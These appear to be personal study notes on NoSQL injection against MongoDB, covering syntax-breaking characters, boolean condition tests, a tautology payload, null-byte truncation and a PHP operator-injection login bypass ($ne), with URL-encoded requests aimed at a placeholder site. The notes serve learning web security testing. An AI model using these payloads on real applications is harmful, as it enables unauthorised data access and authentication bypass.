### Syntax injection
This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
### Test
#### Determining which chars are processed
should break syntax and change response:
```
this.category == '''
```
should not affect
```
this.category == '\''
```
##### Confirming conditional behavior
Send two requests `' && 0 && 'x` and  `' && 1 && 'x` as follows: 

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```
 If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.
##### Overriding existing conditions
`'||'1'=='1`

https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
results in mongodb query:
```
this.category == 'fizzy'||'1'=='1'
```

##### Null character
mongodb ignores all after it. like comment in sql injection.
```
https://insecure-website.com/product/lookup?category=fizzy'%00
```
query:
```
this.category == 'fizzy'\u0000' && this.released == 1
```



### Operator injection
Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.



(PHP) #php
`user[$ne]=test&pass[$ne]=asdf&remember=`

![[Pasted image 20250120063827.png]]